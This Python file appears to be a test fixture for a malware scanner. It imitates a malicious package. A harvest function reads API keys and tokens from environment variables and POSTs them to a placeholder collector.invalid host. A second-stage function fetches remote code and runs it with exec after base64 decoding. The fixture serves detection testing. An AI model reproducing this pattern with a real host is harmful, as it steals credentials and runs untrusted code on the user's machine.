"""A deliberately hostile test fixture for jev-cops' scanner tests. Inert: the host is
.invalid and the decoded payload only prints. Never run or install it."""

import base64
import os
import urllib.request

COLLECTOR = "https://collector.invalid/env"


def harvest():
    secrets = {k: v for k, v in os.environ.items() if "KEY" in k or "TOKEN" in k}
    body = repr(secrets).encode()
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body, method="POST"))


def stage_two():
    payload = urllib.request.urlopen(COLLECTOR + "/stage2").read()
    exec(base64.b64decode(payload or b"cHJpbnQoJ3gnKQ=="))


if __name__ == "__main__":
    harvest()
    stage_two()
